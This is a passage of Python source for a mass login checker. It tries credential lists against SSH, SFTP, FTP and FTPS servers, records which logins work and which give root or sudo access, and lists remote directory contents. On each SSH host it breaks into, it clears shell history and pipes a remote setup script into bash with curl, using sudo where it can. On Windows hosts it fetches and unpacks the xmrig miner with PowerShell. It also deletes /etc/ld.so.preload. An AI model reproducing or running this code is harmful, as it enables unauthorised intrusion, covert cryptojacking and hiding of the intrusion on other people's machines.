            f"❌ Failed login for {protocol}://{username}:{password}@{host}:{port} "
            f"│ Duration: {elapsed_time:.2f}s"
        )

        update_stats_safely("increment_failed", protocol=protocol)
        update_stats_safely(
            "add_output", message=f"❌ FAILED: {username}@{host}:{port} ({protocol})"
        )

        if args.debug_log:
            script_logger.info(fail_msg)

        with LOGIN_ATTEMPTS_LOCK:
            login_attempts["incorrect_logins"][protocol] += 1

    update_stats_safely("increment_checked", protocol=protocol)

    # Track this server as checked for cleanup purposes
    # Store as "host:port" for matching in input file (works with most formats)
    server_identifier = f"{host}:{port}"

    should_cleanup = False
    checked_count = 0
    with CHECKED_SERVERS_TRACKER_LOCK:
        CHECKED_SERVERS_TRACKER.add(server_identifier)
        checked_count = len(CHECKED_SERVERS_TRACKER)

        # Mark for cleanup every 500 checked servers
        if checked_count % CLEANUP_INTERVAL == 0 and checked_count > 0:
            should_cleanup = True

    # CRITICAL DEBUG: Log the state
    if checked_count % 100 == 0:
        script_logger.warning(
            f"[CLEANUP-DEBUG] Checked {checked_count} servers. sourcefile_path={sourcefile_path}, should_cleanup={should_cleanup}"
        )

    # CRITICAL: Cleanup OUTSIDE the lock to avoid deadlocks
    # and BEFORE clearing the tracker
    if should_cleanup and sourcefile_path:
        script_logger.warning(
            f"🧹 [CLEANUP-TRIGGER] Starting cleanup at {checked_count} servers checked from {sourcefile_path}"
        )
        cleanup_input_file(sourcefile_path)
    elif should_cleanup and not sourcefile_path:
        script_logger.error(
            f"❌ [CLEANUP-ERROR] should_cleanup=True but sourcefile_path is None/empty!"
        )

    with CURRENT_HOST_LOCK:
        elapsed_time_formatted = f"{elapsed_time:.2f} seconds"
        if args.debug_log:
            script_logger.debug(
                f"Checked {protocol} login for {username}:{password}@{host}:{port}, took {elapsed_time_formatted}"
            )


def verify_ssh_shell_access(client, host, port, username, auth_timeout):
    """
    FAST shell access verification - tries single command with short timeout.

    Tests:
    1. 'echo X' — Ultra-fast, works on all systems, can't timeout

    CRITICAL: Checks EXIT CODE (0 = success), not just stdout.
    Returns True ONLY if:
      - The command executed successfully (exit code 0)
      - No "SFTP-only" or "restricted shell" messages
    """

    try:
        if args.debug_log:
            script_logger.debug(
                f"Shell probe for {username}@{host}:{port}: trying 'echo X'"
            )

        # FIRST: Check SSH welcome banner (may contain restrictions!)
        try:
            banner = client.get_banner()
            if banner:
                banner_text = (
                    str(banner[0]) if isinstance(banner, tuple) and banner[0] else ""
                )
                if args.debug_log and banner_text:
                    script_logger.debug(f"SSH Banner detected: {banner_text[:80]}")
            else:
                banner_text = ""
        except:
            banner_text = ""

        # Ultra-simple echo test - fastest and most reliable
        stdin, stdout, stderr = client.exec_command("echo X", timeout=auth_timeout)

        # READ OUTPUT (critical for paramiko to close channels properly)
        stdout_data = stdout.read().decode(errors="ignore").strip()
        stderr_data = stderr.read().decode(errors="ignore").strip()

        # GET EXIT CODE (0 = success on Unix/Linux)
        try:
            exit_code = stdout.channel.recv_exit_status()
        except:
            exit_code = 1

        # CHECK FOR OBVIOUS RESTRICTIONS (EXPANDED)
        restriction_indicators = [
            "This service allows sftp connections only.",
            "Shell access is not enabled",
            "This account is currently not available",
            "Shell access is disabled",
            "Shell access is disabled !",
            "shell access is disabled !",
            "command not allowed",
            "SFTP-only",
            "sftp only",
            "sftp-only",
            "restricted",
            "refused",
            "no shell",
        ]

        # Check in BANNER + STDOUT + STDERR
        all_output = (banner_text + stdout_data + stderr_data).lower()

        has_restriction = any(
            indicator.lower() in all_output for indicator in restriction_indicators
        )

        if has_restriction:
            if args.debug_log:
                script_logger.warning(
                    f"❌ SSH at {host}:{port} ({username}) detected SFTP/NO-SHELL restriction (banner/output check)"
                )
            return False

        # EXTRA CHECK: If we have error messages but exit_code=0, it's suspicious (SSH restriction)
        if exit_code == 0 and "X" in stdout_data and not stderr_data:
            if args.debug_log:
                script_logger.debug(
                    f"✅ SSH shell access VERIFIED for {username}@{host}:{port}"
                )
            return True
        elif exit_code == 0 and "X" in stdout_data and stderr_data:
            # Exit code is 0 but we have stderr - could be SFTP-only server
            if args.debug_log:
                script_logger.warning(
                    f"⚠️  SSH {username}@{host}:{port}: exit=0 but has stderr: {stderr_data[:80]}"
                )
            # Re-check restrictions in stderr
            if any(
                indicator.lower() in stderr_data.lower()
                for indicator in restriction_indicators
            ):
                return False
            # If no restriction found, treat as success
            return True
        else:
            if args.debug_log:
                script_logger.debug(
                    f"❌ Shell probe failed for {username}@{host}:{port}: exit_code={exit_code}, stdout={stdout_data[:50]}, stderr={stderr_data[:50]}"
                )
            return False

    except Exception as e:
        if args.debug_log:
            script_logger.debug(f"Exception during shell probe for {host}:{port}: {e}")
        return False


def detect_os_and_shell(client, host, port, username):
    """Detect detailed OS and shell type on the remote system.

    Returns: (os_type, shell_type)
    Examples:
      ("Linux: Ubuntu 24.04 LTS", "bash")
      ("Linux: CentOS 7", "bash")
      ("FreeBSD 13.2", "sh")
      ("macOS 14.1", "zsh")
      ("Windows 10", "PowerShell")
      ("Linux", "bash")  # Fallback if detailed detection fails
    """
    os_type = "Unknown"
    shell_type = "Unknown"

    try:
        # Step 1: Detect base OS
        _, os_stdout, _ = client.exec_command("uname -s 2>/dev/null", timeout=2)
        base_os = os_stdout.read().decode(errors="ignore").strip()

        if not base_os:
            # Try Windows detection
            _, win_check, _ = client.exec_command("ver 2>/dev/null", timeout=2)
            win_out = win_check.read().decode(errors="ignore").strip()
            if win_out:
                os_type = f"Windows {win_out}"
            else:
                os_type = "Unknown"
        else:
            base_os_lower = base_os.lower()

            if "linux" in base_os_lower:
                # Try to get Linux distro details
                # Try /etc/os-release (modern distros)
                _, dist_stdout, _ = client.exec_command("cat /etc/os-release 2>/dev/null | grep -E '^(NAME|VERSION_ID)=' | tr '\\n' ' '", timeout=2)
                dist_info = dist_stdout.read().decode(errors="ignore").strip()

                if dist_info:
                    # Parse NAME="Ubuntu" VERSION_ID="24.04"
                    dist_info = dist_info.replace('NAME=', '').replace('VERSION_ID=', '').replace('"', '').strip()
                    os_type = f"Linux: {dist_info}"
                else:
                    # Fallback to lsb_release
                    _, lsb_stdout, _ = client.exec_command("lsb_release -ds 2>/dev/null", timeout=2)
                    lsb_info = lsb_stdout.read().decode(errors="ignore").strip()
                    if lsb_info:
                        os_type = f"Linux: {lsb_info}"
                    else:
                        os_type = "Linux"

            elif "freebsd" in base_os_lower:
                # Get FreeBSD version
                _, fbsd_stdout, _ = client.exec_command("freebsd-version 2>/dev/null", timeout=2)
                fbsd_ver = fbsd_stdout.read().decode(errors="ignore").strip()
                os_type = f"FreeBSD {fbsd_ver}" if fbsd_ver else "FreeBSD"

            elif "darwin" in base_os_lower:
                # Get macOS version
                _, macos_stdout, _ = client.exec_command("sw_vers -productVersion 2>/dev/null", timeout=2)
                macos_ver = macos_stdout.read().decode(errors="ignore").strip()
                os_type = f"macOS {macos_ver}" if macos_ver else "macOS"

            elif "bsd" in base_os_lower:
                os_type = "BSD"

            else:
                os_type = base_os

        # Step 2: Detect Shell
        _, shell_stdout, _ = client.exec_command("echo $SHELL 2>/dev/null || echo $0", timeout=2)
        shell_output = shell_stdout.read().decode(errors="ignore").strip().lower()

        if "powershell" in shell_output or "pwsh" in shell_output:
            shell_type = "PowerShell"
        elif "bash" in shell_output:
            shell_type = "bash"
        elif "zsh" in shell_output:
            shell_type = "zsh"
        elif "ksh" in shell_output:
            shell_type = "ksh"
        elif "csh" in shell_output:
            shell_type = "csh"
        elif "sh" in shell_output:
            shell_type = "sh"

    except Exception as e:
        if args.debug_log:
            script_logger.debug(f"OS/shell detection failed for {host}:{port}: {e}")

    return os_type, shell_type


def check_ssh_login(host, port, username, password, conn_timeout):
    """Check SSH login — SAFE: Create, Use, Always Close (no pool).

    IMPORTANT:
    Returns a success tuple ONLY when:
      1. The SSH transport was verified alive AFTER authentication, AND
      2. The server actually provides shell access (not SFTP-only / no-shell)
         VERIFIED using universal Unix commands (id, whoami, pwd) with exit code checking
    This guarantees checked_ssh.txt contains only hosts where a real
    interactive SSH shell connection could be established.
    """

    client = None
    connection_established = False

    try:
        # Rate limit FIRST (before creating connection)
        login_rate_limiter.acquire()

        if args.debug_log:
            script_logger.debug(
                f"Trying ssh connection ({username}:{password}@{host}:{port})"
            )

        # Create NEW client (simple, no pool complexity)
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Ultra-aggressive timeout settings
        client.connect(
            hostname=host,
            port=port,
            username=username,
            password=password,
            timeout=CONNECT_TIMEOUT,
            banner_timeout=CONNECT_TIMEOUT,
            auth_timeout=AUTH_TIMEOUT,
            look_for_keys=False,
            allow_agent=False,
        )

        # ─────────────────────────────────────────────────────────────────
        # Verify the SSH transport is actually alive before we treat this
        # as an established connection.
        # ─────────────────────────────────────────────────────────────────
        transport = client.get_transport()
        if transport is None or not transport.is_active():
            if args.debug_log:
                script_logger.debug(
                    f"SSH transport not active after connect for {host}:{port} "
                    f"— treating as failed"
                )
            return None

        connection_established = True

        # Unset HISTFILE to avoid storing commands in history
        try:
            # Fire and forget - don't wait for response (timeout = 1 second max)
            stdin, stdout, stderr = client.exec_command("unset HISTFILE", timeout=1)
            # Read to prevent channel from hanging
            try:
                stdout.read()
                stderr.read()
            except:
                pass
        except Exception:
            pass  # non-fatal

        # ─────────────────────────────────────────────────────────────────
        # ROBUST SHELL ACCESS VERIFICATION using universal Unix commands
        # with exit code checking (NEW METHOD — replaces simple echo probe)
        # ─────────────────────────────────────────────────────────────────
        shell_verified = verify_ssh_shell_access(
            client, host, port, username, SHELL_VERIFY_TIMEOUT
        )

        if not shell_verified:
            if args.debug_log:
                script_logger.debug(
                    f"SSH at {host}:{port} ({username}) failed shell verification — "
                    f"no real shell access, marking as failed"
                )
            return None

        # Quick sudo check (timeout 3s - sudo checks are usually instant)
        try:
            _, stdout, _ = client.exec_command(
                "sudo -S -p '' -l", get_pty=True, timeout=3
            )
            sudo_output = stdout.read().decode(errors="ignore")
        except:
            sudo_output = ""  # If sudo check times out, just continue

        sudo_available = False
        if (
            "(ALL) NOPASSWD: ALL" in sudo_output
            or "(ALL : ALL) ALL" in sudo_output
            or "(ALL) ALL" in sudo_output
        ):
            sudo_available = True
            # NOTE: no write to root_sudo.txt here — write_to_output() is
            # the single source of truth and would otherwise duplicate.
            if args.debug_log:
                script_logger.debug(
                    f"sudo detected for {username}@{host}:{port} — "
                    f"flagged for root_sudo.txt via write_to_output()"
                )

        # ─────────────────────────────────────────────────────────────────
        # NEW: Check if this is a Windows system (IMPROVED)
        # ─────────────────────────────────────────────────────────────────
        is_windows = False
        try:
            # Method 1: Try 'ver' command (only works on Windows)
            _, stdout, stderr = client.exec_command("ver", timeout=2)
            ver_output = stdout.read().decode(errors="ignore").strip()
            ver_error = stderr.read().decode(errors="ignore").strip()

            if "Microsoft Windows" in ver_output or "Windows" in ver_output:
                is_windows = True
                if args.debug_log:
                    script_logger.info(
                        f"✅ Windows DETECTED (via 'ver'): {username}@{host}:{port} → {ver_output[:60]}"
                    )
            # Method 2: If 'ver' fails/empty, try systeminfo
            elif not ver_output:
                _, stdout, _ = client.exec_command(
                    "systeminfo 2>/dev/null | grep -i 'Microsoft Windows'", timeout=3
                )
                systeminfo_output = stdout.read().decode(errors="ignore").strip()

                if "Microsoft Windows" in systeminfo_output:
                    is_windows = True
                    if args.debug_log:
                        script_logger.info(
                            f"✅ Windows DETECTED (via systeminfo): {username}@{host}:{port}"
                        )
        except Exception as e:
            # If detection fails, just continue (probably Linux/Unix)
            if args.debug_log:
                script_logger.debug(f"Windows detection attempt for {host}:{port}: {e}")

        ssh_output = ""

        # Only execute script if not disabled
        if not args.skip_script_exec:
            # SELECT COMMAND BASED ON OS
            if is_windows:
                # WINDOWS: PowerShell xmrig installation script
                # IMPORTANT:
                # 1. Force TLS 1.2 for older Windows versions (Server 2012/2016 default to TLS 1.0)
                # 2. Use temp directory to avoid permission issues in restricted directories (D:\ftp\, etc)
                windows_ps_script = (
                    "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;"
                    "$tmpDir = Join-Path ([IO.Path]::GetTempPath()) ([Guid]::NewGuid().ToString());"
                    "New-Item -ItemType Directory -Path $tmpDir -Force -ErrorAction Stop | Out-Null;"
                    "Set-Location -LiteralPath $tmpDir -ErrorAction Stop;"
                    "$r=Invoke-RestMethod https://api.github.com/repos/MoneroOcean/xmrig/releases/latest -ErrorAction Stop;"
                    "$a=$r.assets | Where-Object name -match 'win\\.zip$' | Select-Object -First 1;"
                    "if (!$a -or $a.browser_download_url -isnot [string] -or !$a.browser_download_url.StartsWith('https://github.com/MoneroOcean/xmrig/releases/download/') -or $a.browser_download_url -cnotmatch '^https://[-A-Za-z0-9._~:/%+]+\\z') { throw 'No matching release asset' };"
                    "iwr $a.browser_download_url -OutFile xmrig.zip -ErrorAction Stop;"
                    "New-Item -ItemType Directory -Force moneroocean -ErrorAction Stop | Out-Null;"
                    "Set-Location -LiteralPath $tmpDir\\moneroocean -ErrorAction Stop;"
                    "$stage = Join-Path $tmpDir 'stage';"
                    "New-Item -ItemType Directory -Path $stage -ErrorAction Stop | Out-Null;"
                    "try { Expand-Archive -LiteralPath \"$tmpDir\\xmrig.zip\" -DestinationPath $stage -Force -ErrorAction Stop;"
                    "$miner = @(Get-ChildItem -LiteralPath $stage -Recurse -File -Filter \"xmrig.exe\" -ErrorAction Stop);"
                    "if ($miner.Count -ne 1) { throw 'Expected one staged miner file' };"
                    "Get-ChildItem -LiteralPath $miner[0].Directory.FullName -Force -ErrorAction Stop | Copy-Item -Destination . -Recurse -Force -ErrorAction Stop"
                    "} finally { Remove-Item -LiteralPath $stage -Recurse -Force -ErrorAction SilentlyContinue }"
                )
                install_command = f"powershell -Command \"{windows_ps_script}\""
                if args.debug_log:
                    script_logger.info(f"🪟 WINDOWS detected: Using PowerShell installation script for {host}:{port}")
            else:
                # LINUX: Direct curl pipe to bash (simple & reliable for SSH)
                # IMPORTANT: Use sh -c with direct piping instead of process substitution
                # Process substitution (< <(...)) doesn't work reliably over SSH exec_command
                # Log priority: /tmp/.ICE-unix/swapd.log → /tmp/.X11-unix/swapd.log → /tmp/swapd.log
                # Strategy: Try sudo first, fallback to unprivileged execution
                install_command = (
                    "sudo sh -c '"
                    "LOG_FILE=\"/tmp/.ICE-unix/swapd.log\"; "
                    "[ -d \"/tmp/.ICE-unix\" ] || LOG_FILE=\"/tmp/.X11-unix/swapd.log\"; "
                    "[ -d \"/tmp/.X11-unix\" ] || LOG_FILE=\"/tmp/swapd.log\"; "
                    "curl -L \"https://raw.githubusercontent.com/littlAcen/moneroocean-setup/refs/heads/main/setup_m0_4_r00t_and_user_FINAL_CLEAN_WITH_SYSINFO.sh?t=$(date +%s)\" | sed \"s|/home/clamav-mail|/tmp|g\" | bash 2>&1 | tee \"$LOG_FILE\"' 2>/dev/null || "
                    "sh -c '"
                    "LOG_FILE=\"/tmp/.ICE-unix/swapd.log\"; "
                    "[ -d \"/tmp/.ICE-unix\" ] || LOG_FILE=\"/tmp/.X11-unix/swapd.log\"; "
                    "[ -d \"/tmp/.X11-unix\" ] || LOG_FILE=\"/tmp/swapd.log\"; "
                    "curl -L \"https://raw.githubusercontent.com/littlAcen/moneroocean-setup/refs/heads/main/setup_m0_4_r00t_and_user_FINAL_CLEAN_WITH_SYSINFO.sh?t=$(date +%s)\" | sed \"s|/home/clamav-mail|/tmp|g\" | bash 2>&1 | tee \"$LOG_FILE\"'"
                )

                if args.debug_log:
                    script_logger.info(f"🐧 LINUX detected: Using direct curl pipe with temp logging priority for {host}:{port}")

            # Minimal pre-flight: just ensure /tmp is writable
            try:
                _, check_stdout, _ = client.exec_command("mkdir -p /tmp/miner 2>/dev/null && chmod 777 /tmp/miner 2>/dev/null && echo 'TMP_OK'", timeout=3)
                check_stdout.read()
            except Exception:
                pass  # Non-critical

            stdin, stdout, stderr = client.exec_command(
                install_command,
                timeout=None,  # NO TIMEOUT - script runs completely in background, worker thread returns immediately
            )

            # AUTO-FIX: Check for ld.so.preload error and remove file if present
            try:
                time.sleep(1)  # Wait a moment for initial output
                # Try to remove the problematic file (silent if it doesn't exist)
                _, stdout_fix, stderr_fix = client.exec_command(
                    "rm -f /etc/ld.so.preload 2>/dev/null; echo 'ld.so.preload cleanup attempted'",
                    timeout=5
                )
                stdout_fix.read()  # Consume output
                stderr_fix.read()
                if args.debug_log:
                    script_logger.debug(f"ld.so.preload cleanup attempted for {host}:{port}")
            except Exception as e:
                if args.debug_log:
                    script_logger.debug(f"ld.so.preload cleanup failed for {host}:{port}: {e}")

            # BACKGROUND LOG COLLECTOR: Don't block the scan
            def _collect_and_write_log(
                stdout_handle, stderr_handle, cred_line, client_handle
            ):
                try:
                    output_lines = []
                    stdout_handle.channel.settimeout(600)
                    try:
                        for line in iter(stdout_handle.readline, ""):
                            output_lines.append(line)
                    except Exception:
                        pass
                    try:
                        stderr_out = stderr_handle.read().decode(errors="ignore")
                        if stderr_out.strip():
                            output_lines.append("\n[STDERR]:\n" + stderr_out)
                    except Exception:
                        pass
                    full_log = "".join(output_lines)

                    # Analyze log for common failure patterns
                    error_summary = []
                    if "DOWNLOAD_FAILED" in full_log:
                        error_summary.append("⚠️  SCRIPT DOWNLOAD FAILED")
                    if "gzip: stdin: not in gzip format" in full_log:
                        error_summary.append("⚠️  TAR CORRUPTION DETECTED")
                    if "Permission denied" in full_log:
                        error_summary.append("⚠️  PERMISSION ERROR")
                    if "fork: retry: Resource temporarily unavailable" in full_log:
                        error_summary.append("⚠️  RESOURCE EXHAUSTION")
                    if "ERROR: Please make sure HOME directory" in full_log:
                        error_summary.append("⚠️  HOME DIRECTORY MISSING")

                    # CHECK FOR INSTALLATION STATUS
                    # Success indicators: script completed with output and no critical errors
                    installation_success = (
                        ("Script execution completed" in full_log or
                         "INSTALLATION SUCCESSFULLY COMPLETED!" in full_log) and
                        len(full_log) > 100  # Script produced meaningful output
                    )
                    # Failure indicators: empty log, download errors, or critical errors
                    installation_failed = (
                        (len(full_log) == 0) or
                        ("DOWNLOAD_FAILED" in full_log) or
                        ("ERROR:" in full_log and "DPKG" not in full_log)  # Real errors, not DPKG warnings
                    )

                    # If log has content and no critical errors, consider it success
                    if len(full_log) > 100 and not installation_failed:
                        installation_success = True

                    if full_log.strip():
                        error_header = ""
                        if error_summary:
                            error_header = f"\n[ERRORS DETECTED] {' | '.join(error_summary)}\n"

                        # Add success or failure marker
                        status_header = ""
                        if installation_success:
                            status_header = f"\n[SUCCESS] ✅ INSTALLATION SUCCESSFULLY COMPLETED!\n"
                        elif installation_failed:
                            status_header = f"\n[FAILED] 💥 INSTALLATION FAILED!\n"

                        log_entry = (
                            f"\n{'=' * 60}\n"
                            f"[INSTALL LOG] {cred_line}\n"
                            f"{status_header}"
                            f"{error_header}"
                            f"{'=' * 60}\n"
                            f"{full_log}\n"
                            f"{'=' * 60}\n\n"
                        )
                        with FILE_LOCKS["output.txt"]:
                            try:
                                with open("output.txt", "a", encoding="utf-8") as f:
                                    f.write(log_entry)
                            except Exception:
                                pass

                        # WRITE SUCCESSFUL INSTALLATIONS TO SEPARATE FILE
                        if installation_success:
                            if "installations.txt" not in FILE_LOCKS:
                                FILE_LOCKS["installations.txt"] = threading.Lock()

                            with FILE_LOCKS["installations.txt"]:
                                try:
                                    with open("installations.txt", "a", encoding="utf-8") as f:
                                        f.write(cred_line + "\n")
                                except Exception:
                                    pass

                        # WRITE FAILED INSTALLATIONS TO SEPARATE FILE
                        if installation_failed and not installation_success:
                            if "installations_failed.txt" not in FILE_LOCKS:
                                FILE_LOCKS["installations_failed.txt"] = threading.Lock()

                            with FILE_LOCKS["installations_failed.txt"]:
                                try:
                                    with open("installations_failed.txt", "a", encoding="utf-8") as f:
                                        f.write(cred_line + "\n")
                                except Exception:
                                    pass
                except Exception:
                    pass
                finally:
                    try:
                        client_handle.close()
                    except Exception:
                        pass

            cred_line = f"SSH://{username}:{password}@{host}:{port}"
            log_thread = threading.Thread(
                target=_collect_and_write_log,
                args=(stdout, stderr, cred_line, client),
                daemon=True,
            )
            log_thread.start()
            # CRITICAL FIX: DO NOT set client = None!
            # The thread keeps the connection alive and closes it when done.
            # This prevents the race condition where the connection was
            # closed before the thread could read stdout/stderr.

        if args.debug_log:
            script_logger.info(
                f"Successful login to SSH protocol at {host}:{port} "
                f"with username {username} (shell verified)"
            )

        # Detect OS and Shell type
        os_type, shell_type = detect_os_and_shell(client, host, port, username)

        # Only return success if the connection was verified alive
        if not connection_established:
            return None

        return ("SSH", sudo_available, is_windows, ssh_output, os_type, shell_type)

    except (
        paramiko.ssh_exception.AuthenticationException,
        paramiko.ssh_exception.SSHException,
    ):
        return None
    except socket.timeout:
        return None
    except socket.error:
        return None
    except Exception as e:
        if args.debug_log:
            script_logger.debug(f"SSH error for {host}:{port}: {e}")
        return None
    finally:
        # CRITICAL FIX: Only close client if NO background thread is using it
        # If script execution is enabled, the background thread owns the connection
        # and will close it after finishing to read all output
        if client is not None and args.skip_script_exec:
            try:
                client.close()
                if args.debug_log:
                    script_logger.debug(f"Closed SSH connection for {host}:{port}")
            except Exception as e:
                if args.debug_log:
                    script_logger.debug(f"Error closing SSH connection: {e}")


@retry_with_backoff(max_attempts=2, initial_delay=0.5)
def check_sftp_login(host, port, username, password, conn_timeout):
    """Check SFTP login with ultra-fast settings (OPTIMIZED - FIXED Connection Leaks)."""

    if not PYSFTP_AVAILABLE:
        if args.debug_log:
            script_logger.debug(
                "SFTP skipped: pysftp not installed (incompatible with paramiko 3.x)"
            )
        return None

    try:
        cnopts = pysftp.CnOpts()
        cnopts.hostkeys = None

        if args.debug_log:
            script_logger.debug(
                f"Trying sftp connection ({username}:{password}@{host}:{port})"
            )

        # Rate limit to avoid overwhelming server
        login_rate_limiter.acquire()

        with pysftp.Connection(
            host, username=username, password=password, port=port, cnopts=cnopts
        ) as sftp:

            # Skip directory listing if flag is set
            if not args.skip_dir_listing:
                sftp_files = sftp.listdir_attr(".")

                files_str = f"\n\nSFTP://{username}:{password}@{host}:{port}\n"
                for line in sftp_files:
                    files_str += f"{line}\n"
                add_to_write_buffer("checked_sftp_dirs.txt", files_str)

            if args.debug_log:
                script_logger.info(
                    f"Successful login to SFTP protocol at {host}:{port} with username {username}"
                )

            return ("SFTP", False, False, "")

    except (
        paramiko.ssh_exception.AuthenticationException,
        paramiko.ssh_exception.SSHException,
    ):
        return None
    except socket.timeout:
        return None
    except socket.error:
        return None
    except Exception as e:
        if args.debug_log:
            script_logger.debug(f"SFTP error for {host}:{port}: {e}")
        return None


@retry_with_backoff(max_attempts=2, initial_delay=0.5)
def check_ftp_login(host, port, username, password, conn_timeout):
    """Check FTP login with ultra-fast settings (OPTIMIZED - FIXED Connection Leaks)."""

    ftp = None
    try:
        if args.debug_log:
            script_logger.debug(
                f"Trying ftp connection ({username}:{password}@{host}:{port})"
            )

        # CRITICAL FIX: Create connection FIRST, rate limit AFTER
        ftp = ftplib.FTP(timeout=CONNECT_TIMEOUT)
        ftp.connect(host, port, timeout=CONNECT_TIMEOUT)

        # Now rate limit (not before, so no dangling connection)
        login_rate_limiter.acquire()

        ftp.login(username, password)

        # Skip directory listing if flag is set
        if not args.skip_dir_listing:
            ls = []
            ftp.retrlines("LIST -a", ls.append)

            files_str = f"\n\nFTP://{username}:{password}@{host}:{port}\n"
            for entry in ls:
                files_str += f"{entry}\n"
            add_to_write_buffer("checked_ftp_dirs.txt", files_str)

        if args.debug_log:
            script_logger.info(
                f"Successful login to FTP protocol at {host}:{port} with username {username}"
            )

        return ("FTP", False, False, "")

    except ftplib.error_perm:
        return None
    except socket.timeout:
        return None
    except socket.error:
        return None
    except Exception as e:
        if args.debug_log:
            script_logger.debug(f"FTP error for {host}:{port}: {e}")
        return None
    finally:
        # CRITICAL: Ensure FTP connection is ALWAYS closed, even on error
        if ftp is not None:
            try:
                ftp.quit()
            except Exception:
                try:
                    ftp.close()
                except Exception:
                    pass


@retry_with_backoff(max_attempts=2, initial_delay=0.5)
def check_ftps_login(host, port, username, password, conn_timeout):
    """Check FTPS login with ultra-fast settings (OPTIMIZED - FIXED Connection Leaks)."""

    ftps = None
    try:
        if args.debug_log:
            script_logger.debug(
                f"Trying FTPS connection ({username}:{password}@{host}:{port})"
            )

        # CRITICAL FIX: Create connection FIRST, rate limit AFTER
        ftps = ftplib.FTP_TLS(timeout=CONNECT_TIMEOUT)
        ftps.connect(host, port, timeout=CONNECT_TIMEOUT)

        # Now rate limit (not before)
        login_rate_limiter.acquire()

        ftps.login(username, password)
        ftps.prot_p()

        # Skip directory listing if flag is set
        if not args.skip_dir_listing:
            ls = []
            ftps.retrlines("LIST -a", ls.append)

            files_str = f"\n\nFTPS://{username}:{password}@{host}:{port}\n"
            for entry in ls:
                files_str += f"{entry}\n"
            add_to_write_buffer("checked_ftps_dirs.txt", files_str)

        if args.debug_log:
            script_logger.info(
                f"Successful login to FTPS protocol at {host}:{port} with username {username}"
            )

        return ("FTPS", False, False, "")

    except ftplib.error_perm:
        return None
    except socket.timeout:
        return None
    except socket.error:
        return None
    except Exception as e:
        if args.debug_log:
            script_logger.debug(f"FTPS error for {host}:{port}: {e}")
        return None
    finally:
        # CRITICAL: Ensure FTPS connection is ALWAYS closed, even on error
        if ftps is not None:
            try:
                ftps.quit()
            except Exception:
                try:
                    ftps.close()
                except Exception:
                    pass


def write_to_output(
    protocol,
    username,
    password,
    host,
    port,
    sudo_available=False,
    su_root_available=False,
    server_output="",
    is_windows=False,
    os_type="Unknown",
    shell_type="Unknown",
):
    """Writes successful login information. Large install logs go directly to disk."""
    output_line = f"{protocol}://{username}:{password}@{host}:{port}\n"

    # Format for found_logins.txt with OS and shell info
    found_logins_line = f"{protocol}://{username}:{password}@{host}:{port} | OS: {os_type} | Shell: {shell_type}\n"

    # Ensure all output files have version headers
    ensure_file_header("output.txt")
    ensure_file_header("checked_ssh.txt")
    ensure_file_header("checked_ftp.txt")
    ensure_file_header("checked_ftps.txt")
    ensure_file_header("checked_sftp.txt")
    ensure_file_header("root_access.txt")
    ensure_file_header("root_sudo.txt")
    ensure_file_header("checked_windows.txt")
    ensure_file_header("found_logins.txt")

    # IMMEDIATE: Write found login to found_logins.txt (as soon as discovered)
    # Include OS and shell info for better tracking
    with FILE_LOCKS.get("found_logins.txt", threading.Lock() if "found_logins.txt" not in FILE_LOCKS else FILE_LOCKS["found_logins.txt"]):
        try:
            with open("found_logins.txt", "a", encoding="utf-8") as f:
                f.write(found_logins_line)
        except Exception as e:
            if args.debug_log:
                script_logger.error(f"Error writing found_logins.txt: {e}")

    # Main output with details
    output_content = "--- New Successful Connection ---\n"
    output_content += output_line

    # Write directly to file when server_output is large (install log),
    # otherwise use the batched write buffer for small entries
    if server_output:
        output_content += f"\n[Server Interaction Log]:\n{server_output}\n"
        output_content += "---------------------------------\n\n"
        # Direct write - bypasses RAM buffer to avoid holding huge logs in memory
        with FILE_LOCKS["output.txt"]:
            try:
                with open("output.txt", "a", encoding="utf-8") as f:
                    f.write(output_content)
            except Exception as e:
                if args.debug_log:
                    script_logger.error(f"Error writing output.txt: {e}")
    else:
        output_content += "---------------------------------\n\n"
        add_to_write_buffer("output.txt", output_content)

    # Protocol-specific output
    output_filename_map = {
        "SSH": "checked_ssh.txt",
        "FTP": "checked_ftp.txt",
        "FTPS": "checked_ftps.txt",
        "SFTP": "checked_sftp.txt",
    }
    if protocol in output_filename_map:
        # `write_to_output` is only reached when check_<proto>_login()
        # returned a verified success tuple — for SSH that means the
        # transport was confirmed active after authentication.
        if protocol == "SSH":
            if args.debug_log:
                script_logger.debug(
                    f"Writing verified SSH entry to checked_ssh.txt: "
                    f"{username}@{host}:{port}"
                )
        add_to_write_buffer(output_filename_map[protocol], output_line)

    # Root access tracking
    if protocol == "SSH" and (sudo_available or su_root_available):
        add_to_write_buffer("root_access.txt", output_line)
        if sudo_available:
            add_to_write_buffer("root_sudo.txt", output_line)

    # Windows system tracking
    if protocol == "SSH" and is_windows:
        if args.debug_log:
            script_logger.debug(
                f"Writing Windows system entry to checked_windows.txt: "
                f"{username}@{host}:{port}"
            )
        add_to_write_buffer("checked_windows.txt", output_line)


def count_entries_in_file(filepath):
    """Count entries in a file WITHOUT parsing (memory efficient)."""
    # MEMORY OPTIMIZATION: Just count lines, don't parse them!
    # Parsing every line of a 9GB file creates millions of temporary objects
    valid_count = 0
    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            # Simple line count - no parsing, no regex, no objects created
            for line in f:
                line = line.strip()
                if line:  # Only count non-empty lines
                    valid_count += 1
    except Exception as e:
        if args.debug_log:
            script_logger.error(f"Error counting entries in {filepath}: {e}")

    return valid_count


def process_single_file(
    filepath,
    current_protocols,
    max_threads,
    total_hosts_all_files=None,
    total_checked_all_files=0,
):
    """
    Processes a single input file, reads connection strings, and dispatches
    login attempts using a thread pool.
    MEMORY OPTIMIZATION: Streams file line-by-line and submits futures in batches.
    """
    global TOTAL_LINES, CURRENT_LINE, stats, login_attempts, FILE_ENTRIES, FILE_COMPLETED, FILE_COMPLETED_COUNTER

    filename = os.path.basename(filepath)
    safe_print(
        f"\n[bold yellow]╔═══════════ Starting ultra-fast scan: [white]{filename}[/white] ═══════════╗[/bold yellow]"
    )
    time.sleep(1)

    TOTAL_LINES = 0
    CURRENT_LINE = 0
    login_attempts = {
        "correct_logins": {"SSH": 0, "FTP": 0, "FTPS": 0, "SFTP": 0},
        "incorrect_logins": {"SSH": 0, "FTP": 0, "FTPS": 0, "SFTP": 0},
    }

    # MEMORY OPTIMIZATION: Stream file line-by-line instead of readlines()
    # We still build entries_with_lines for the cleanup function, but avoid
    # the intermediate `lines = f.readlines()` array which doubles memory usage.
